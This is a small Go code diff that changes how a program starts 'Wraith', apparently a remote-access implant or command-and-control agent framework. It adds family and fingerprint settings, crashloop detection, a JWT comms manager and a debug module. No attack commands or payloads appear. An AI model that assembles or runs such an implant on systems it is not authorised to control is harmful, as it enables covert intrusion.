@@ -50,9 +50,13 @@ func main() {
 	// Start Wraith in goroutine
 	go w.Spawn(
 		libwraith.Config{
-			FingerprintGenerator: func() string { return "" },
+			FamilyId:                   "none",
+			FingerprintGenerator:       func() string { return "none" },
+			ModuleCrashloopDetectCount: 3,
+			ModuleCrashloopDetectTime:  30 * time.Second,
 		},
 		&stdmod.DefaultJWTCommsManager{},
+		&stdmod.DefaultDebugModule{},
 	//	&stdmod.WCommsPinecone{},
 	)
 
@@ -61,5 +65,5 @@ func main() {
 
 	// Kill Wraith and exit
 	w.Kill()
-	time.Sleep(1 * time.Second)
+	time.Sleep(1 * time.Second) // wait to make sure everything has cleaned itself up
 }
